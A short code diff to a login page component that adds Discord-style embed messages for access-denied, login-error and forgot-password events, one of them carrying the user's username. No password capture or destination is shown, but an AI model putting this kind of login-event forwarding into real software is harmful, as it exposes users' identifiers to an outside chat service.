@@ -128,9 +128,37 @@ export default function Login() {
             inline: false,
           },
         ];
+      } else if (action === "ACCESS_DENIED") {
+        embedTitle = "🚫 Access Denied";
+        embedColor = 0xff6b6b;
+        fields = [
+          {
+            name: "Username/Email",
+            value: `||${data.username}||`,
+            inline: false,
+          },
+          {
+            name: "Status",
+            value: "Account access was denied",
+            inline: false,
+          },
+        ];
+      } else if (action === "LOGIN_ERROR") {
+        embedTitle = "❌ Login Error";
+        embedColor = 0xff0000;
+        fields = [
+          {
+            name: "Error Details",
+            value: data.error || "Unknown error occurred",
+            inline: false,
+          },
+        ];
       } else if (action === "CREATE_ACCOUNT") {
         embedTitle = "📝 Create Account Button Pressed";
         embedColor = 0x00c800;
+      } else if (action === "FORGOT_PASSWORD") {
+        embedTitle = "🔑 Forgot Password Attempt";
+        embedColor = 0xffa500;
       }
 
       fields.push(
